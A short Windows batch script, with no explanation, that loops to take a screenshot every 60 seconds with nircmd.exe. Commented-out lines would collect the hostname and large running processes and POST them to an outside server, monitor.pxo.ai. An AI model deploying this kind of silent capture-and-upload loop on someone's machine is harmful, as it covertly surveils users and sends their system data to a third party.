:loop
REM hostname > c:/host.txt
REM set /p USER=<c:/host.txt
REM set header="User: %USER%"
REM for /f %%i in ('tasklist /fi "MEMUSAGE gt 209600"') do curl -X POST -H "Content-Type: text/plain" -H %header% --data-raw %%i http://monitor.pxo.ai/api/save
REM TIMEOUT /T 30
set fn=%random%.jpg
nircmd.exe cmdwait 60000 savescreenshot %fn%
goto loop
 